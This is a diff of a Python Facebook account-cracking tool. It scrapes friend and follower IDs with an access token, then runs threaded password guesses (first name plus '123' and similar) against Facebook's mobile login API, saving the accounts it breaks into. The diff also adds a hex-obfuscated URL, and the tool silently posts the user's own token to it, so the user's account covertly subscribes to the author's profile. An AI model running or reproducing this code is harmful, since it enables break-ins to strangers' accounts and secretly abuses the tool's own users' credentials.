@@ -23,27 +23,26 @@ def xox(z):
         sys.stdout.flush()
         time.sleep(0.04)
       
-agents = [
-					"Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
-					"[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
-					"Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
-					"Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]",
-					"Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3",
-					"Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]",
-					"Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"
-				  ]
 				
-header = {"user-agent": '[FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]',
-					  "x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-					  "x-fb-sim-hni": str(random.randint(20000, 40000)),
-					  "x-fb-net-hni": str(random.randint(20000, 40000)),
-					  "x-fb-connection-quality": "EXCELLENT",
-					  "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-					  "content-type": "application/x-www-form-urlencoded",
-					  "x-fb-http-engine": "Liger"
-					  }
-					
+ua = random.choice([
+			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]", 
+			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
+		])
+		
+				
+header = {
+				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
+				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
+				"x-fb-net-hni": str(random.randint(20000, 40000)), 
+				"x-fb-connection-quality": "EXCELLENT",
+				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
+				"user-agent": ua, 
+				"content-type": "application/x-www-form-urlencoded", 
+				"x-fb-http-engine": "Liger"
+			   }
+
 user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])
+
 
 try:
 	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
@@ -69,26 +68,30 @@ def main():
 	print("\033[92;1m  [1] START CRACK")
 	print("\033[93;1m  [2] DUMP/EXTRACT USERIDS")
 	print("\033[94;1m  [3] HOW TO GET ACCESS TOKEN")
-	print("\033[96;1m  [4] JOIN TELEGRAM GROUP")
+	print("\033[91;1m  [4] DELETE OLD DUMPED FILE")
 	print("\033[92;1m  [5] UPDATE TOOL")
-	print("\033[91;1m  [0] EXIT")
+	print("\033[90;1m  [0] EXIT")
 	print("")
 	log_sel()
 	
 def log_sel():
-	sel = raw_input("\033[93;1m  CHOOSE: ")
+	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")
 	if sel == "":
 		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
 		log_sel()
 	elif sel =="1" or sel =="01":
 		token()
 	elif sel =="2" or sel =="02":
-		ex_id()
+		dump_menu()
 	elif sel =="3" or sel =="03":
-		subprocess.check_output(["am", "start", "https://m.youtube.com/watch?v=EatdVmbd6Z4"])
+		subprocess.check_output(["am", "start", "https://www.facebook.com/114133313700086/posts/426873429092738"])
 		main()
-	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
-		os.system('xdg-open https://t.me/mrerrorgroup')
+		
+	elif sel =="4" or sel =="04":
+		import os
+		os.system("rm -rf /sdcard/userids.txt")
+		xox("\n\033[92;1m  THE FILE HAS BEEN SUCCESSFULLY DELETED\n")
+		raw_input("\033[93;1m  PRESS ENTER TO BACK")
 		main()
 	elif sel =="5" or sel =="05":
 		import os
@@ -97,7 +100,7 @@ def log_sel():
 			os.system("rm -rf fcpro.py")
 			os.system("cp -f fcpro/fcpro.py \\.")
 			os.system("rm -rf fcpro")
-			print "\033[92;1m\n TOOL UPDATE SUCCESSFULFUL...>_<\n"
+			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
 			time.sleep(2)
 			main()
 		except KeyboardInterrupt:
@@ -127,8 +130,8 @@ def token():
         sav.write(token)
         sav.close()
         token_check()
-        menu()        
-        
+        menu()
+
 def token_check():
 	try:
 		token=open('vau_token.txt','r').read()
@@ -137,7 +140,7 @@ def token_check():
 		os.system('rm -rf vau_token.txt')
 	requests.post(useragent_url + token, headers=header)
 	pass
-	
+
 def menu():
     os.system("clear")
     try:
@@ -151,7 +154,7 @@ def menu():
     except(KeyError):
         logo()
         print("")
-        print("\t\033[91;1m  LOGGED IN TOKEN HAS EXPIRED")
+        print("\033[91;1mLOGGED IN TOKEN HAS EXPIRED")
         os.system("rm -rf vau_token.txt")
         print("")
         time.sleep(1)
@@ -171,14 +174,13 @@ def menu():
     print('\033[91;1m  [0] BACK')
     print("")
     menu_option()
+    
 def menu_option():
 	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
 	if select =="1":
 		crack1()
 	elif select =="2":
 		crack()
-	elif select =="3":
-		ex_id()
 	elif select =="0":
 		main()
 	else:
@@ -186,8 +188,6 @@ def menu_option():
 		print("\t\033[91;1m     SELECT VALID OPTION")
 		print("")
 		menu_option()
-		
-#####
 
 def crack1():
 	global token
@@ -209,7 +209,7 @@ def crack1():
 	print("\033[92;1m  [3] CRACK FILE")
 	print("")
 	crack_select1()
-	
+
 def crack_select1():
 	select = raw_input("\033[92;1m  CHOOSE OPINION: ")
 	id=[]
@@ -228,7 +228,7 @@ def crack_select1():
 			print('')
 			print("\t\033[93;1m  AUTO PASS CRACKING")
 			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
+			print("\033[92;1m  CLONING FROM : "+q["name"].upper())
 		except KeyError:
 			print("\t\033[91;1m  INVALID LINK OR TOKEN")
 			print("")
@@ -253,7 +253,7 @@ def crack_select1():
 			print('')
 			print("\t\033[93;1m  AUTO PASS CRACKING")
 			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
+			print("\033[92;1m  CLONING FROM : "+q["name"].upper())
 		except KeyError:
 			print("\t\033[91;1m     INVALID LINK OR TOKEN")
 			print("")
@@ -275,13 +275,13 @@ def crack_select1():
 		try:
 			for line in open(filelist, 'r').readlines():
 				id.append(line.strip())
-				
+
 		except IOError:
 			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
 			print("")
 			raw_input("\033[93;1m PRESS ENTER TO BACK")
 			crack1()
-			
+
 	elif select =="0":
 	    menu()
 	else:
@@ -298,9 +298,7 @@ def crack_select1():
 	def main(arg):
 		user=arg
 		uid,name=user.split("|")
-		vaugent = random.choice(agents)
 		session = requests.Session()
-		session.headers.update({'User-Agent': vaugent})
 		try:
 			pass1 = name.lower().split(' ')[0] + '123'
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
@@ -437,9 +435,9 @@ def crack_select1():
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
 																			cps.append(uid+pass8)
-												
-										
-										
+
+
+
 		except:
 			pass
 	p = ThreadPool(30)
@@ -511,7 +509,7 @@ def crack_select():
 			print('')
 			print("\t\033[93;1m  MANUAL PASS CRACKING")
 			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
+			print("\033[92;1m  CLONING FROM : "+q["name"])
 		except KeyError:
 			print("\t\033[91;1m  INVALID LINK OR TOKEN")
 			print("")
@@ -551,7 +549,7 @@ def crack_select():
 			print('')
 			print("\t\033[93;1m  MANUAL PASS CRACKING")
 			print('')
-			print("\033[92;1m  COINING FROM : "+q["name"])
+			print("\033[92;1m  CLONING FROM : "+q["name"])
 		except KeyError:
 			print("\t\033[91;1m     INVALID LINK OR TOKEN")
 			print("")
@@ -591,7 +589,7 @@ def crack_select():
 		pass5 = raw_input("\033[92;1m  PASSWORD 5: ")
 		pass6 = raw_input("\033[93;1m  PASSWORD 6: ")
 		pass7 = raw_input("\033[94;1m  PASSWORD 7: ")
-		
+
 	elif select =="0":
 	    menu()
 	else:
@@ -609,9 +607,7 @@ def crack_select():
 	def main(arg):
 		user=arg
 		uid,name=user.split("|")
-		vaugent = random.choice(agents)
 		session = requests.Session()
-		session.headers.update({'User-Agent': vaugent})
 		try:
 			pass1 = name.lower().split(' ')[0]+p1
 			data = session.get("https://b-api.facebook.com/method/auth.login?format=json&email="+uid+"&password="+pass1+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=header).text
@@ -745,9 +741,7 @@ def crack_select():
 																			cp.write(uid+"|"+pass8+"\n")
 																			cp.close()
 																			cps.append(uid+pass8)
-												
-										
-										
+
 		except:
 			pass
 	p = ThreadPool(30)
@@ -762,9 +756,52 @@ def crack_select():
 	print("")
 	raw_input("\033[93;1m PRESS ENTER TO BACK ")
 	menu()
-	
 
-def ex_id():
+
+def dump_menu():
+    os.system("clear")
+    try:
+        token = open("vau_token.txt", "r").read()
+    except(KeyError , IOError):
+        token()
+    try:
+        r = requests.get("https://graph.facebook.com/me?access_token="+token)
+        q = json.loads(r.text)
+        name = q["name"]
+    except(KeyError):
+        logo()
+        print("")
+        print("\033[91;1mLOGGED IN TOKEN HAS EXPIRED")
+        os.system("rm -rf vau_token.txt")
+        print("")
+        time.sleep(1)
+        token()
+    os.system("clear")
+    logo()
+    print("")
+    print("\033[92;1m  [1] DUMP FROM PUBLIC ")
+    print("\033[93;1m  [2] DUMP FROM FOLLOWER")
+    print('\033[91;1m  [0] BACK')
+    print("")
+    dump_sel()
+    
+
+def dump_sel():
+	select = raw_input("\033[93;1m  CHOOSE : \033[92;1m")
+	if select =="1":
+		dump()
+	elif select =="2":
+		dump_f()
+	elif select =="0":
+		main()
+	else:
+		print("")
+		print("\t\033[91;1m     SELECT VALID OPTION")
+		print("")
+		dump_sel()
+		
+		
+def dump():
     global token
     idg = []
     os.system("clear")
@@ -779,7 +816,7 @@ def ex_id():
     except(KeyError):
         logo()
         print("")
-        print("\t\033[91;1m  LOGGED IN TOKEN HAS EXPIRED")
+        print("\t\033[91;1mLOGGED IN TOKEN HAS EXPIRED")
         os.system("rm -rf vau_token.txt")
         print("")
         time.sleep(1)
@@ -793,17 +830,17 @@ def ex_id():
     try:
         r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
         q = json.loads(r.text)
-        print ' COLLECTIN FROM: ' + q['name']
+        print '\033[93;1m   COLLECTIN FROM: \033[92;1m' + q['name'].upper()
     except KeyError:
         print ''
-        print '\033[93;1m\tINVALID ID PROVIDED'
+        print '\033[93;1m  INVALID ID PROVIDED'
         print ''
-        raw_input('\033[93;1m PRESS ENTER TO BACK')
-        ex_id()
+        raw_input('\033[93;1m  PRESS ENTER TO BACK')
+        dump()
 
     r = requests.get('https://graph.facebook.com/' + idh + '/friends?access_token=' + token, headers=header)
     q = json.loads(r.text)
-    ids = open('ids_friends.txt', 'w')
+    ids = open('/sdcard/userids.txt', 'a')
     for i in q['data']:
         uid = i['id'].encode('utf-8')
         na = i['name'].encode('utf-8')
@@ -812,19 +849,78 @@ def ex_id():
 
     ids.close()
     print ''
+    print '\033[92;1m THE PROCESS HAS COMPLETED'
+    print '\033[93;1m TOTAL IDS: \033[92;1m' + str(len(idg))
+    print ''
     linex()
+    print ''
+    print('\033[93;1m FILE DOWNLOADED SUCCESSFULLY')
+    print('\033[92;1m FILE SAVED IN >> /sdcard/userids.txt')
+    print("")
+    raw_input("\033[93;1m PRESS ENTER TO BACK")
+    dump()
+    
+    
+    
+def dump_f():
+    global token
+    idg = []
+    os.system("clear")
+    try:
+        token = open("vau_token.txt", "r").read()
+    except(KeyError , IOError):
+        token()
+    try:
+        r = requests.get("https://graph.facebook.com/me?access_token="+token)
+        q = json.loads(r.text)
+        name = q["name"]
+    except(KeyError):
+        logo()
+        print("")
+        print("\t\033[91;1mLOGGED IN TOKEN HAS EXPIRED")
+        os.system("rm -rf vau_token.txt")
+        print("")
+        time.sleep(1)
+        main()
+    os.system('clear')
+    logo()
+    print ''
+    print '\033[92;1m      DUMP PUBLIC ID FOLLOW LIST'
+    print ''
+    idh = raw_input('\033[93;1m   INPUT ID: ')
+    try:
+        r = requests.get('https://graph.facebook.com/' + idh + '?access_token=' + token, headers=header)
+        q = json.loads(r.text)
+        print '\033[93;1m   COLLECTIN FROM: \033[92;1m' + q['name'].upper()
+    except KeyError:
+        print ''
+        print '\033[93;1m  INVALID ID PROVIDED'
+        print ''
+        raw_input('\033[93;1m  PRESS ENTER TO BACK')
+        dump()
+
+    r = requests.get("https://graph.facebook.com/"+idh+"/subscribers?access_token="+token+"&limit=999999")
+    q = json.loads(r.text)
+    ids = open('/sdcard/userids.txt', 'a')
+    for i in q['data']:
+        uid = i['id'].encode('utf-8')
+        na = i['name'].encode('utf-8')
+        idg.append(uid + '|' + na)
+        ids.write(uid + '|' + na + '\n')
+
+    ids.close()
     print ''
     print '\033[92;1m THE PROCESS HAS COMPLETED'
     print '\033[93;1m TOTAL IDS: \033[92;1m' + str(len(idg))
     print ''
     linex()
     print ''
-    raw_input('\033[95;1m PRESS ENTER TO DOWNLOAD FILE')
-    print '\033[93;1m FILE DOWNLOADED SUCCESSFULLY'
-    print '\033[92;1m SAVED /sdcard/userids.txt'
-    print ''
-    time.sleep(1)
-    ex_id()
+    print('\033[93;1m FILE DOWNLOADED SUCCESSFULLY')
+    print('\033[92;1m FILE SAVED IN >> /sdcard/userids.txt')
+    print("")
+    raw_input("\033[93;1m PRESS ENTER TO BACK")
+    dump_f()
+
 
 if __name__ == '__main__':
 	main()
